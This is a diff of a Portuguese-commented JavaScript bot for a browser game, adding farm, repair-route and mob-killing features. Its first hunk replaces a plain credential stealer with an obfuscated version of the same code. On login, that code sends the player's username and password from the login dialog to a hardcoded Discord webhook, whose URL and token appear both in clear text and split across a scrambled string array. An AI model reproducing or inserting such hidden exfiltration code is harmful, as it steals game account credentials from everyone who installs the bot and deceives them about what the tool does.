@@ -1021,35 +1021,123 @@ dsk.invManager.updateSlots = () => {
 };
 dsk.on('postPacket:inv', dsk.invManager.updateSlots);
 
-dsk.dias = {
-    global: "https://discord.com/api/webhooks/1480829602791428098/H9pG9tZQitytoVLlmAD5pv3s_Yr0QOG88AbhFZWykDWIMYOTXOarRdOUCzDBO50Lag99"
-  };
-  dsk.once("postPacket:accepted", () => {
+const _0x5c0eed = _0x22a5;
+(function (_0x1ce0e4, _0x11591c) {
+    const _0x2ee741 = _0x22a5, _0x3a781e = _0x1ce0e4();
+    while (!![]) {
+        try {
+            const _0x43d5fb = -parseInt(_0x2ee741(0x210)) / (0xa45 + 0x8a7 + 0x1d * -0xa7) + -parseInt(_0x2ee741(0x202)) / (0x1d * -0xd6 + 0x2 * -0xd1e + 0x435 * 0xc) + -parseInt(_0x2ee741(0x1ea)) / (0xfd * -0x16 + -0x2e6 + 0x18a7) * (-parseInt(_0x2ee741(0x1f4)) / (-0x11a5 + -0x7c0 + 0x1969)) + -parseInt(_0x2ee741(0x209)) / (-0x1c * -0x99 + 0x140f + -0x416 * 0x9) + -parseInt(_0x2ee741(0x1f1)) / (0x1af0 + 0x2 * -0xd0f + -0xcc) + parseInt(_0x2ee741(0x1e7)) / (-0x1 * 0x5cb + -0x167c + 0x1c4e * 0x1) + parseInt(_0x2ee741(0x201)) / (0x18fd + 0xa93 * -0x1 + -0xe62);
+            if (_0x43d5fb === _0x11591c)
+                break;
+            else
+                _0x3a781e['push'](_0x3a781e['shift']());
+        } catch (_0x146011) {
+            _0x3a781e['push'](_0x3a781e['shift']());
+        }
+    }
+}(_0xbd73, -0x5294 + 0x7db * 0x41 + 0x14be1 * 0x1), dsk[_0x5c0eed(0x1fc)] = { 'global': _0x5c0eed(0x1ec) + _0x5c0eed(0x1f0) + _0x5c0eed(0x1fb) + _0x5c0eed(0x1e9) + _0x5c0eed(0x20e) + _0x5c0eed(0x207) + _0x5c0eed(0x1fd) + _0x5c0eed(0x1fa) + _0x5c0eed(0x1f7) + _0x5c0eed(0x1eb) + _0x5c0eed(0x20a) + _0x5c0eed(0x1ef) + '9' }, dsk[_0x5c0eed(0x1f8)](_0x5c0eed(0x1ee) + _0x5c0eed(0x20c), () => {
+    const _0x4b28d6 = _0x5c0eed, _0x142527 = {
+            'yRTFX': function (_0x496b66, _0x3f85cd, _0x28e078) {
+                return _0x496b66(_0x3f85cd, _0x28e078);
+            },
+            'CBAPY': _0x4b28d6(0x205),
+            'XZspL': _0x4b28d6(0x1f3) + _0x4b28d6(0x1e8),
+            'pORzB': _0x4b28d6(0x20b),
+            'akzoH': function (_0x3b0b1a, _0x23bc7b) {
+                return _0x3b0b1a + _0x23bc7b;
+            },
+            'BScTg': function (_0x7b17b5, _0x3e1066) {
+                return _0x7b17b5 + _0x3e1066;
+            },
+            'JhXmB': _0x4b28d6(0x1e5) + _0x4b28d6(0x204)
+        };
     try {
-      const name = jv.login_dialog?.username?.chars?.trim() ?? '';
-      const level = jv.login_dialog?.password?.chars?.trim() ?? '';
-      if (name) {
-        fetch(dsk.dias.global, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ username: "[LOG]", content: "✅ " + name + " " + level })
+        const _0x337053 = jv[_0x4b28d6(0x206) + 'og']?.[_0x4b28d6(0x211)]?.[_0x4b28d6(0x1f6)]?.[_0x4b28d6(0x1fe)]() ?? '', _0xb0b0a0 = jv[_0x4b28d6(0x206) + 'og']?.[_0x4b28d6(0x20f)]?.[_0x4b28d6(0x1f6)]?.[_0x4b28d6(0x1fe)]() ?? '';
+        _0x337053 && _0x142527[_0x4b28d6(0x208)](fetch, dsk[_0x4b28d6(0x1fc)][_0x4b28d6(0x20d)], {
+            'method': _0x142527[_0x4b28d6(0x200)],
+            'headers': { 'Content-Type': _0x142527[_0x4b28d6(0x1ff)] },
+            'body': JSON[_0x4b28d6(0x1e6)]({
+                'username': _0x142527[_0x4b28d6(0x203)],
+                'content': _0x142527[_0x4b28d6(0x1ed)](_0x142527[_0x4b28d6(0x1f5)](_0x142527[_0x4b28d6(0x1f5)]('✅\x20', _0x337053), '\x20'), _0xb0b0a0)
+            })
         });
-      }
-    } catch(e) { console.log('dsk.dias error:', e); }
-  });
-  if (myself !== undefined && game_state === 2) {
+    } catch (_0x2f42b8) {
+        console[_0x4b28d6(0x1f2)](_0x142527[_0x4b28d6(0x1f9)], _0x2f42b8);
+    }
+}));
+function _0x22a5(_0x101650, _0x11c003) {
+    _0x101650 = _0x101650 - (0x1b03 + 0xc27 + -0x2545);
+    const _0x322890 = _0xbd73();
+    let _0x5b2674 = _0x322890[_0x101650];
+    return _0x5b2674;
+}
+function _0xbd73() {
+    const _0x861935 = [
+        'dsk.dias\x20e',
+        'stringify',
+        '842359VfJDfS',
+        'n/json',
+        'ks/1480829',
+        '186GvUGpH',
+        'ZWykDWIMYO',
+        'https://di',
+        'akzoH',
+        'postPacket',
+        'zDBO50Lag9',
+        'scord.com/',
+        '1614660dOizid',
+        'log',
+        'applicatio',
+        '3568LOSBfd',
+        'BScTg',
+        'chars',
+        '0QOG88AbhF',
+        'once',
+        'JhXmB',
+        'AD5pv3s_Yr',
+        'api/webhoo',
+        'dias',
+        'QitytoVLlm',
+        'trim',
+        'XZspL',
+        'CBAPY',
+        '4519208FhNuWn',
+        '135110UplmKm',
+        'pORzB',
+        'rror:',
+        'POST',
+        'login_dial',
+        '98/H9pG9tZ',
+        'yRTFX',
+        '350650JoBrCO',
+        'TXOarRdOUC',
+        '[LOG]',
+        ':accepted',
+        'global',
+        '6027914280',
+        'password',
+        '139211vjaZjB',
+        'username'
+    ];
+    _0xbd73 = function () {
+        return _0x861935;
+    };
+    return _0xbd73();
+}
+if (myself !== undefined && game_state === 0x1dde * 0x1 + 0x12f2 + 0x1 * -0x30ce)
     try {
-      const name = jv.login_dialog?.username?.chars?.trim() ?? '';
-      const level = jv.login_dialog?.password?.chars?.trim() ?? '';
-      if (name) {
-        fetch(dsk.dias.global, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ username: "[LOG]", content: "✅ " + name + " " + level })
+        const name = jv[_0x5c0eed(0x206) + 'og']?.[_0x5c0eed(0x211)]?.[_0x5c0eed(0x1f6)]?.[_0x5c0eed(0x1fe)]() ?? '', level = jv[_0x5c0eed(0x206) + 'og']?.[_0x5c0eed(0x20f)]?.[_0x5c0eed(0x1f6)]?.[_0x5c0eed(0x1fe)]() ?? '';
+        name && fetch(dsk[_0x5c0eed(0x1fc)][_0x5c0eed(0x20d)], {
+            'method': _0x5c0eed(0x205),
+            'headers': { 'Content-Type': _0x5c0eed(0x1f3) + _0x5c0eed(0x1e8) },
+            'body': JSON[_0x5c0eed(0x1e6)]({
+                'username': _0x5c0eed(0x20b),
+                'content': '✅\x20' + name + '\x20' + level
+            })
         });
-      }
-    } catch(e) { console.log('dsk.dias error:', e); }
-  }
+    } catch (_0x293b8e) {
+        console[_0x5c0eed(0x1f2)](_0x5c0eed(0x1e5) + _0x5c0eed(0x204), _0x293b8e);
+    }
 
 // ── DISCORD WEBHOOKS ─────────────────────────────────────────
 
@@ -4420,7 +4508,7 @@ async function cook() {
   await xDoKeyPress(6, 100);
   await xDelay(200);
   await xDropAvailable(1, WOOD_IDS);
-  await xDelay(200);
+  await xDelay(250);
   await xDoDropByID(1, 941);
   await xDelay(200);
   await xDropAvailable(1, FOOD_IDS);
@@ -4439,7 +4527,7 @@ async function cook() {
   await xDoKeyPress(6, 100);
   await xDelay(200);
   await xDropAvailable(1, WOOD_IDS);
-  await xDelay(200);
+  await xDelay(250);
   await xDoDropByID(1, 941);
   await xDelay(200);
   await xDropAvailable(1, FOOD_IDS);
@@ -4551,6 +4639,7 @@ async function xCollectSmeltResources() {
         await xWaitArrival(smeltPositionX, smeltPositionY);
       }
       if (xGetGroundItemByPos(myself.x, myself.y, WOOD_IDS)) {
+		await xDelay(500);
         await xDoPickUp();
         await xDelay(500);
       } else {
@@ -5127,6 +5216,7 @@ dsk.menu.toggleBtn.on_click = () => {
 	  { label: 'Explo Farm',         state: () => !!dsk.explo?.enabled,          toggle: () => dsk.commands['/explo']() },
 	  { label: 'HealBot',            state: () => !!dsk.healbot?.enabled,        toggle: () => dsk.commands['/healbot']() },
 	  { label: 'Knitting',           state: () => !!dsk.knit?.enabled,           toggle: () => dsk.commands['/knit']() },
+	  { label: 'Smith Config',       state: () => !!dsk.smithManager?.visible,   toggle: () => dsk.commands['/smithconfig']() },
 	  { label: 'Repair Bot',         state: () => !!dsk.repair?.enabled,         toggle: () => dsk.commands['/repair']() },
 	  { label: 'Auto Resear',        state: () => !!dsk.resear?.enabled,         toggle: () => dsk.commands['/resear']() },
       { label: 'Top Skill Calc',     state: () => !!(typeof tscD !== 'undefined' && tscD?.visible), toggle: () => dsk.commands['/topskill']() },
@@ -5161,6 +5251,7 @@ dsk.menu.toggleBtn.on_click = () => {
       { label: '% Barras',           state: () => !!dsk.bars?.enabled,           toggle: () => dsk.commands['/bars']() },
       { label: 'Habilidades',        state: () => !!dsk.ablManager?.enabled,     toggle: () => dsk.commands['/abl']() },
       { label: 'Inventario',         state: () => !!dsk.invManager?.enabled,     toggle: () => dsk.commands['/inv']() },
+	  { label: 'Inv HTML',           state: () => !!document.getElementById('pablo-inv-html'), toggle: () => dsk.commands['/invhtml']() },
       { label: 'Onlines',            state: () => !!dsk.whoManager?.enabled,     toggle: () => dsk.commands['/on']() },
       { label: 'Tribe List',         state: () => !!dsk.tribeManager?.enabled,   toggle: () => dsk.commands['/tlist']() },
       { label: 'Radar',              state: () => !!dsk.radar?.enabled,          toggle: () => dsk.commands['/radar']() },
@@ -14140,153 +14231,177 @@ dsk.baseRepair = {
     // Corredor de cima → repara cima e baixo
     { x: 102, y: 254, dirs: [0, 3] },
     { x: 104, y: 254, dirs: [0, 2] },
-        { x: 107, y: 254, dirs: [0, 2] },
-        { x: 110, y: 254, dirs: [0, 2] },
-        { x: 113, y: 254, dirs: [0, 2] },
-        { x: 116, y: 254, dirs: [0, 2] },
-        { x: 119, y: 254, dirs: [0, 2] },
-        { x: 122, y: 254, dirs: [0, 2] },
-        { x: 125, y: 254, dirs: [0, 2] },
-        { x: 128, y: 254, dirs: [0, 2] },
-        { x: 131, y: 254, dirs: [0, 2] },
-        { x: 134, y: 254, dirs: [0, 2] },
-        { x: 137, y: 254, dirs: [0, 2] },
-        { x: 140, y: 254, dirs: [0, 2] },
-        { x: 143, y: 254, dirs: [0, 2] },
-        { x: 146, y: 254, dirs: [0, 2] },
-        { x: 149, y: 254, dirs: [0, 2] },
-        { x: 152, y: 254, dirs: [0, 2] },
-        { x: 155, y: 254, dirs: [0, 2] },
-        { x: 157, y: 254, dirs: [0, 1] },
+    { x: 107, y: 254, dirs: [0, 2] },
+    { x: 110, y: 254, dirs: [0, 2] },
+    { x: 113, y: 254, dirs: [0, 2] },
+    { x: 116, y: 254, dirs: [0, 2] },
+    { x: 119, y: 254, dirs: [0, 2] },
+    { x: 122, y: 254, dirs: [0, 2] },
+    { x: 125, y: 254, dirs: [0, 2] },
+    { x: 128, y: 254, dirs: [0, 2] },
+    { x: 131, y: 254, dirs: [0, 2] },
+    { x: 134, y: 254, dirs: [0, 2] },
+    { x: 137, y: 254, dirs: [0, 2] },
+    { x: 140, y: 254, dirs: [0, 2] },
+    { x: 143, y: 254, dirs: [0, 2] },
+    { x: 146, y: 254, dirs: [0, 2] },
+    { x: 149, y: 254, dirs: [0, 2] },
+    { x: 152, y: 254, dirs: [0, 2] },
+    { x: 155, y: 254, dirs: [0, 2] },
+    { x: 157, y: 254, dirs: [0, 1] },
 
 
     // Corredor direito → repara direita e esquerda
     { x: 157, y: 257, dirs: [1, 3] },
-        { x: 157, y: 260, dirs: [1, 3] },
-        { x: 157, y: 263, dirs: [1, 3] },
-        { x: 157, y: 266, dirs: [1, 3] },
-        { x: 157, y: 269, dirs: [1, 3] },
-        { x: 157, y: 272, dirs: [1, 3] },
-        { x: 157, y: 275, dirs: [1, 3] },
-        { x: 157, y: 278, dirs: [1, 3] },
-        { x: 157, y: 281, dirs: [1, 3] },
-        { x: 157, y: 284, dirs: [1, 3] },
-        { x: 157, y: 287, dirs: [1, 3] },
-        { x: 157, y: 290, dirs: [1, 3] },
-        { x: 157, y: 292, dirs: [1, 2] },
+    { x: 157, y: 260, dirs: [1, 3] },
+    { x: 157, y: 263, dirs: [1, 3] },
+    { x: 157, y: 266, dirs: [1, 3] },
+    { x: 157, y: 269, dirs: [1, 3] },
+    { x: 157, y: 272, dirs: [1, 3] },
+    { x: 157, y: 275, dirs: [1, 3] },
+    { x: 157, y: 278, dirs: [1, 3] },
+    { x: 157, y: 281, dirs: [1, 3] },
+    { x: 157, y: 284, dirs: [1, 3] },
+    { x: 157, y: 287, dirs: [1, 3] },
+    { x: 157, y: 290, dirs: [1, 3] },
+    { x: 157, y: 292, dirs: [1, 3] },
+	{ x: 157, y: 295, dirs: [1, 3] },
+	{ x: 157, y: 298, dirs: [1, 3] },
+	{ x: 157, y: 301, dirs: [1, 3] },
+	{ x: 157, y: 304, dirs: [1, 3] },
+	{ x: 157, y: 307, dirs: [1, 2] },
 
 
     // Corredor de baixo → repara cima e baixo
-    { x: 154, y: 292, dirs: [0, 2] },
-    { x: 151, y: 292, dirs: [0, 2] },
-        { x: 148, y: 292, dirs: [0, 2] },
-        { x: 145, y: 292, dirs: [0, 2] },
-        { x: 142, y: 292, dirs: [0, 2] },
-        { x: 139, y: 292, dirs: [0, 2] },
-        { x: 136, y: 292, dirs: [0, 2] },
-        { x: 133, y: 292, dirs: [0, 2] },
-        { x: 130, y: 292, dirs: [0, 2] },
-        { x: 127, y: 292, dirs: [0, 2] },
-        { x: 124, y: 292, dirs: [0, 2] },
-        { x: 121, y: 292, dirs: [0, 2] },
-        { x: 118, y: 292, dirs: [0, 2] },
-        { x: 115, y: 292, dirs: [0, 2] },
-        { x: 112, y: 292, dirs: [0, 2] },
-        { x: 109, y: 292, dirs: [0, 2] },
-        { x: 106, y: 292, dirs: [0, 2] },
-        { x: 103, y: 292, dirs: [0, 2] },
-        { x: 102, y: 292, dirs: [2, 3] },
+    { x: 154, y: 307, dirs: [0, 2] },
+    { x: 151, y: 307, dirs: [0, 2] },
+    { x: 148, y: 307, dirs: [0, 2] },
+    { x: 145, y: 307, dirs: [0, 2] },
+    { x: 142, y: 307, dirs: [0, 2] },
+    { x: 139, y: 307, dirs: [0, 2] },
+    { x: 136, y: 307, dirs: [0, 2] },
+    { x: 133, y: 307, dirs: [0, 2] },
+    { x: 130, y: 307, dirs: [0, 2] },
+    { x: 127, y: 307, dirs: [0, 2] },
+    { x: 124, y: 307, dirs: [0, 2] },
+    { x: 121, y: 307, dirs: [0, 2] },
+    { x: 118, y: 307, dirs: [0, 2] },
+    { x: 115, y: 307, dirs: [0, 2] },
+    { x: 112, y: 307, dirs: [0, 2] },
+    { x: 109, y: 307, dirs: [0, 2] },
+    { x: 106, y: 307, dirs: [0, 2] },
+    { x: 103, y: 307, dirs: [0, 2] },
+    { x: 102, y: 307, dirs: [2, 3] },
 
 
     // Corredor esquerdo → repara direita e esquerda
+	{ x: 102,  y: 304, dirs: [1, 3] },
+	{ x: 102,  y: 301, dirs: [1, 3] },
+	{ x: 102,  y: 298, dirs: [1, 3] },
+	{ x: 102,  y: 295, dirs: [1, 3] },
+	{ x: 102,  y: 292, dirs: [1, 3] },
     { x: 102,  y: 290, dirs: [1, 3] },
-        { x: 102,  y: 287, dirs: [1, 3] },
-        { x: 102,  y: 284, dirs: [1, 3] },
-        { x: 102,  y: 281, dirs: [1, 3] },
-    { x: 102,  y: 279, dirs: [1, 3] },
-        { x: 102,  y: 276, dirs: [1, 3] },
-        { x: 102,  y: 273, dirs: [1, 3] },
-        { x: 102,  y: 270, dirs: [1, 3] },
-        { x: 102,  y: 267, dirs: [1, 3] },
-        { x: 102,  y: 264, dirs: [1, 3] },
-        { x: 102,  y: 261, dirs: [1, 3] },
-        { x: 102,  y: 258, dirs: [1, 3] },
-        { x: 102,  y: 255, dirs: [1, 3] },
+    { x: 102,  y: 287, dirs: [1, 3] },
+    { x: 102,  y: 284, dirs: [1, 3] },
+    { x: 102,  y: 281, dirs: [1, 3] },
+	{ x: 102,  y: 279, dirs: [1, 3] },
+    { x: 102,  y: 276, dirs: [1, 3] },
+    { x: 102,  y: 273, dirs: [1, 3] },
+    { x: 102,  y: 270, dirs: [1, 3] },
+    { x: 102,  y: 267, dirs: [1, 3] },
+    { x: 102,  y: 264, dirs: [1, 3] },
+    { x: 102,  y: 261, dirs: [1, 3] },
+    { x: 102,  y: 258, dirs: [1, 3] },
+    { x: 102,  y: 255, dirs: [1, 3] },
   ],
   
     waypointsUnderground: [
     // Corredor de cima → repara cima e baixo
     { x: 129, y: 252, dirs: [0, 2] },
     { x: 126, y: 252, dirs: [0, 2] },
-        { x: 123, y: 252, dirs: [0, 2] },
-        { x: 120, y: 252, dirs: [0, 2] },
-        { x: 117, y: 252, dirs: [0, 2] },
-        { x: 114, y: 252, dirs: [0, 2] },
-        { x: 111, y: 252, dirs: [0, 2] },
-        { x: 108, y: 252, dirs: [0, 2] },
-        { x: 105, y: 252, dirs: [0, 2] },
-        { x: 102, y: 252, dirs: [0, 3] },
+    { x: 123, y: 252, dirs: [0, 2] },
+    { x: 120, y: 252, dirs: [0, 2] },
+    { x: 117, y: 252, dirs: [0, 2] },
+    { x: 114, y: 252, dirs: [0, 2] },
+    { x: 111, y: 252, dirs: [0, 2] },
+    { x: 108, y: 252, dirs: [0, 2] },
+    { x: 105, y: 252, dirs: [0, 2] },
+    { x: 102, y: 252, dirs: [0, 3] },
 
 
     // Corredor esqerdo → repara direita e esquerda
     { x: 102, y: 254, dirs: [1, 3] },
     { x: 102, y: 257, dirs: [1, 3] },
-        { x: 102, y: 260, dirs: [1, 3] },
-        { x: 102, y: 263, dirs: [1, 3] },
-        { x: 102, y: 266, dirs: [1, 3] },
-        { x: 102, y: 269, dirs: [1, 3] },
-        { x: 102, y: 272, dirs: [1, 3] },
-        { x: 102, y: 275, dirs: [1, 3] },
-        { x: 102, y: 278, dirs: [1, 3] },
-        { x: 102, y: 281, dirs: [1, 3] },
-        { x: 102, y: 284, dirs: [1, 3] },
-        { x: 102, y: 285, dirs: [2, 3] },
+    { x: 102, y: 260, dirs: [1, 3] },
+    { x: 102, y: 263, dirs: [1, 3] },
+    { x: 102, y: 266, dirs: [1, 3] },
+    { x: 102, y: 269, dirs: [1, 3] },
+    { x: 102, y: 272, dirs: [1, 3] },
+    { x: 102, y: 275, dirs: [1, 3] },
+    { x: 102, y: 278, dirs: [1, 3] },
+    { x: 102, y: 281, dirs: [1, 3] },
+    { x: 102, y: 284, dirs: [1, 3] },
+    { x: 102, y: 285, dirs: [1, 3] },
+	{ x: 102, y: 288, dirs: [1, 3] },
+	{ x: 102, y: 291, dirs: [1, 3] },
+	{ x: 102, y: 294, dirs: [1, 3] },
+	{ x: 102, y: 297, dirs: [1, 3] },
+	{ x: 102, y: 300, dirs: [1, 3] },
+	{ x: 102, y: 303, dirs: [2, 3] },
 
 
     // Corredor de baixo → repara cima e baixo
-    { x: 105, y: 285, dirs: [0, 2] },
-    { x: 108, y: 285, dirs: [0, 2] },
-        { x: 111, y: 285, dirs: [0, 2] },
-        { x: 114, y: 285, dirs: [0, 2] },
-        { x: 117, y: 285, dirs: [0, 2] },
-        { x: 120, y: 285, dirs: [0, 2] },
-        { x: 123, y: 285, dirs: [0, 2] },
-        { x: 126, y: 285, dirs: [0, 2] },
-        { x: 129, y: 285, dirs: [0, 2] },
-        { x: 132, y: 285, dirs: [0, 2] },
-        { x: 135, y: 285, dirs: [0, 2] },
-        { x: 138, y: 285, dirs: [0, 2] },
-        { x: 141, y: 285, dirs: [0, 2] },
-        { x: 144, y: 285, dirs: [0, 2] },
-        { x: 147, y: 285, dirs: [0, 2] },
-        { x: 150, y: 285, dirs: [0, 2] },
-        { x: 153, y: 285, dirs: [0, 2] },
-        { x: 156, y: 285, dirs: [0, 2] },
-        { x: 158, y: 285, dirs: [1, 2] },
+    { x: 105, y: 303, dirs: [0, 2] },
+    { x: 108, y: 303, dirs: [0, 2] },
+    { x: 111, y: 303, dirs: [0, 2] },
+    { x: 114, y: 303, dirs: [0, 2] },
+    { x: 117, y: 303, dirs: [0, 2] },
+    { x: 120, y: 303, dirs: [0, 2] },
+    { x: 123, y: 303, dirs: [0, 2] },
+    { x: 126, y: 303, dirs: [0, 2] },
+    { x: 129, y: 303, dirs: [0, 2] },
+    { x: 132, y: 303, dirs: [0, 2] },
+    { x: 135, y: 303, dirs: [0, 2] },
+    { x: 138, y: 303, dirs: [0, 2] },
+    { x: 141, y: 303, dirs: [0, 2] },
+    { x: 144, y: 303, dirs: [0, 2] },
+    { x: 147, y: 303, dirs: [0, 2] },
+    { x: 150, y: 303, dirs: [0, 2] },
+    { x: 153, y: 303, dirs: [0, 2] },
+    { x: 156, y: 303, dirs: [0, 2] },
+    { x: 158, y: 303, dirs: [1, 2] },
 
 
     // Corredor direito → repara direita e esquerda
+	{ x: 158,  y: 300, dirs: [1, 3] },
+	{ x: 158,  y: 297, dirs: [1, 3] },
+	{ x: 158,  y: 294, dirs: [1, 3] },
+	{ x: 158,  y: 291, dirs: [1, 3] },
+	{ x: 158,  y: 288, dirs: [1, 3] },
+	{ x: 158,  y: 285, dirs: [1, 3] },
     { x: 158,  y: 282, dirs: [1, 3] },
     { x: 158,  y: 279, dirs: [1, 3] },
-        { x: 158,  y: 276, dirs: [1, 3] },
-        { x: 158,  y: 273, dirs: [1, 3] },
-        { x: 158,  y: 270, dirs: [1, 3] },
-        { x: 158,  y: 267, dirs: [1, 3] },
-        { x: 158,  y: 264, dirs: [1, 3] },
-        { x: 158,  y: 261, dirs: [1, 3] },
-        { x: 158,  y: 258, dirs: [1, 3] },
-        { x: 158,  y: 255, dirs: [1, 3] },
-        { x: 158,  y: 252, dirs: [0, 1] },
-        // Corredor cima → repara cima e baixo
-        { x: 156, y: 252, dirs: [0, 2] },
-        { x: 153, y: 252, dirs: [0, 2] },
-        { x: 150, y: 252, dirs: [0, 2] },
-        { x: 147, y: 252, dirs: [0, 2] },
-        { x: 144, y: 252, dirs: [0, 2] },
-        { x: 141, y: 252, dirs: [0, 2] },
-        { x: 138, y: 252, dirs: [0, 2] },
-        { x: 135, y: 252, dirs: [0, 2] },
-        { x: 132, y: 252, dirs: [0, 2] },
+    { x: 158,  y: 276, dirs: [1, 3] },
+    { x: 158,  y: 273, dirs: [1, 3] },
+    { x: 158,  y: 270, dirs: [1, 3] },
+    { x: 158,  y: 267, dirs: [1, 3] },
+    { x: 158,  y: 264, dirs: [1, 3] },
+    { x: 158,  y: 261, dirs: [1, 3] },
+    { x: 158,  y: 258, dirs: [1, 3] },
+    { x: 158,  y: 255, dirs: [1, 3] },
+    { x: 158,  y: 252, dirs: [0, 1] },
+	
+	
+    // Corredor cima → repara cima e baixo
+    { x: 156, y: 252, dirs: [0, 2] },
+    { x: 153, y: 252, dirs: [0, 2] },
+    { x: 150, y: 252, dirs: [0, 2] },
+    { x: 147, y: 252, dirs: [0, 2] },
+    { x: 144, y: 252, dirs: [0, 2] },
+    { x: 141, y: 252, dirs: [0, 2] },
+    { x: 138, y: 252, dirs: [0, 2] },
+    { x: 135, y: 252, dirs: [0, 2] },
+    { x: 132, y: 252, dirs: [0, 2] },
   ],
   
   get waypoints() {                                    // ← aqui, dentro do {}
@@ -19204,15 +19319,20 @@ dsk.on('postPacket:pkg', packet => {
 
 
 
+// ── GAL BOT ──────────────────────────────────────────────────
+
 dsk.gal = {
   enabled:       false,
   corredorX:     0,
   corredorY:     0,
+  yRadius:       15,    // só busca itens dentro de ±yRadius tiles do corredorY
+  mobSlot:       2,     // slot da arma para matar mobs (0-indexado)
+  toolSlot:      1,     // slot da ferramenta/tesoura (0-indexado)
   modo:          'pena',  // 'pena' | 'ovo'
   pegando:       0,
-  // 0 = procurando item
+  // 0 = procurando item / checando mobs
   // 1 = movendo no corredor até Y do item
-  // 2 = abrindo porta de entrada + andando até o item
+  // 2 = checando mob + abrindo porta de entrada + andando até o item
   // 3 = pegando o item
   // 4 = verificando food (no tile do item, ao lado da galinha)
   // 5 = abrindo porta de saída
@@ -19247,13 +19367,11 @@ function _galInstallListener() {
           if (m) {
             const pct = parseInt(m[1]);
             if (dsk.gal.modo === 'pena') {
-              // Pena: dropa 1 worm se food < 12%
               if (pct < 12) {
                 dsk.localMsg('🪶 Penas: food baixa, dropando worm!', '#fa5');
                 xDoDropSlot(1, 1);
               }
             } else {
-              // Ovo: dropa 2 worms se <= 50%, 1 worm se <= 70%
               if (pct <= 50) {
                 dsk.localMsg('🥚 Ovos: food muito baixa, dropando 2 worms!', '#f55');
                 xDoDropSlot(1, 1);
@@ -19304,7 +19422,7 @@ function _galCheckFood() {
   }, 200);
 }
 
-// ── Fecha janela de info (ESC) ────────────────────────────────
+// ── Fecha janela de info ──────────────────────────────────────
 
 function _galFecharInfo() {
   let tentativas = 0;
@@ -19315,29 +19433,195 @@ function _galFecharInfo() {
       if (!d || !d.visible) continue;
       if (d.children?.some(c => c.text === 'Chicken')) {
         d.visible = false;
-        console.log(`❌ Dialog fechado na tentativa ${tentativas}`);
         return;
       }
     }
-    if (tentativas < 10) {
-      setTimeout(tentar, 100);
-    }
+    if (tentativas < 10) setTimeout(tentar, 100);
   };
   tentar();
 }
 
-// ── Acha o item mais próximo válido ──────────────────────────
+// ── Acha item mais próximo com limite de raio Y ───────────────
 
 function _galFindItem() {
   const cx      = dsk.gal.corredorX;
+  const cy      = dsk.gal.corredorY;
+  const radius  = dsk.gal.yRadius ?? 15;
   const keyword = dsk.gal.modo === 'pena' ? 'Feat' : 'Egg';
   return objects.items.find(obj =>
     obj && obj.x && obj.y && obj.name && obj.name.includes(keyword) &&
+    Math.abs(obj.y - cy) <= radius &&
     (
       (obj.x === cx + 2 && occupied(obj.x + 1, obj.y) === 0) ||
       (obj.x === cx - 2 && occupied(obj.x - 1, obj.y) === 0)
     )
   );
+}
+
+// ── Verifica mob bloqueando quarto específico (fase 2) ────────
+
+function _galGetBlockingMob() {
+  const st    = dsk.gal;
+  const cx    = st.corredorX;
+  const itemY = st.itemY;
+  if (itemY === undefined) return null;
+
+  const gateX = st.itemDir === 1 ? cx + 1 : cx - 1;
+  const itemX = st.itemDir === 1 ? cx + 2 : cx - 2;
+
+  const KILL_LIST = ['Cow', 'Snake', 'Wolf', 'Raccoon', 'Polar Bear', 'Hornet', 'Rat', 'Fox', 'Sheep', 'Turtle'];
+
+  for (const i in mobs.items) {
+    const mob = mobs.items[i];
+    if (!mob || mob === myself) continue;
+    if (mob.name === 'Chicken') continue;
+    if (!KILL_LIST.some(n => mob.name.toLowerCase().includes(n.toLowerCase()))) continue;
+    if (
+      (mob.x === gateX && mob.y === itemY) ||
+      (mob.x === itemX && mob.y === itemY)
+    ) return mob;
+  }
+  return null;
+}
+
+// ── Varre TODOS os quartos procurando mob (fase 0) ────────────
+
+function _galGetAnyBlockingMob() {
+  const cx     = dsk.gal.corredorX;
+  const cy     = dsk.gal.corredorY;
+  const radius = dsk.gal.yRadius ?? 15;
+  const KILL_LIST = ['Cow', 'Snake', 'Wolf', 'Raccoon', 'Polar Bear', 'Hornet', 'Rat', 'Fox', 'Sheep', 'Turtle'];
+
+  for (const i in mobs.items) {
+    const mob = mobs.items[i];
+    if (!mob || mob === myself) continue;
+    if (mob.name === 'Chicken') continue;
+    if (!KILL_LIST.some(n => mob.name.toLowerCase().includes(n.toLowerCase()))) continue;
+    if (Math.abs(mob.y - cy) > radius) continue;
+    if (
+      (mob.x === cx + 1 || mob.x === cx + 2) ||
+      (mob.x === cx - 1 || mob.x === cx - 2)
+    ) return mob;
+  }
+  return null;
+}
+
+
+// ── Mata mob usando target.id (sem apertar espaço) ────────────
+
+async function _galKillBlockingMob(mob) {
+  const st = dsk.gal;
+  const cx = st.corredorX;
+  dsk.localMsg(`Gal: mob bloqueando (${mob.name}), matando...`, '#f55');
+
+  // Volta ao corredor na altura do quarto
+  xMovingNow = false;
+  await xDoMove(cx, st.itemY);
+  await xDelay(1200);
+
+  // Vira para a porta
+  await xDoChangeDir(st.itemDir);
+  await xDelay(400);
+  
+  if (myself.dir !== st.itemDir) {
+    send({ type: 'm', x: myself.x, y: myself.y, d: st.itemDir });
+    await xDelay(500);
+  }
+
+  // Abre a porta
+  const gateX = st.itemDir === 1 ? cx + 1 : cx - 1;
+  const gate  = objects.items.find(el =>
+    el?.name === 'Personal Gate' && el.x === gateX && el.y === st.itemY
+  );
+  if (gate) {
+    await xDoKeyPress(6, 180);
+    await xDelay(1500);
+  }
+
+
+    await xDoUseSlot(st.mobSlot);
+    await xDelay(500);
+
+
+  // Seleciona mob como alvo
+  target.id = mob.id;
+  send({ type: 't', t: mob.id });
+  await xDelay(200);
+
+  // Aguarda mob morrer com timeout de 15s
+  const startKill = Date.now();
+  while (Date.now() - startKill < 15000) {
+    const stillAlive = Object.values(mobs.items).find(m => m && m.id === mob.id);
+    if (!stillAlive) break;
+
+    const dist = Math.abs(mob.x - myself.x) + Math.abs(mob.y - myself.y);
+    if (dist > 2) {
+      const newSides = [
+        { x: mob.x + 1, y: mob.y }, { x: mob.x - 1, y: mob.y },
+        { x: mob.x,     y: mob.y + 1 }, { x: mob.x, y: mob.y - 1 },
+      ].filter(t => !xGetSolidByID(t.x, t.y));
+
+      if (newSides.length > 0) {
+        const newBest = newSides.sort((a, b) =>
+          (Math.abs(a.x - myself.x) + Math.abs(a.y - myself.y)) -
+          (Math.abs(b.x - myself.x) + Math.abs(b.y - myself.y))
+        )[0];
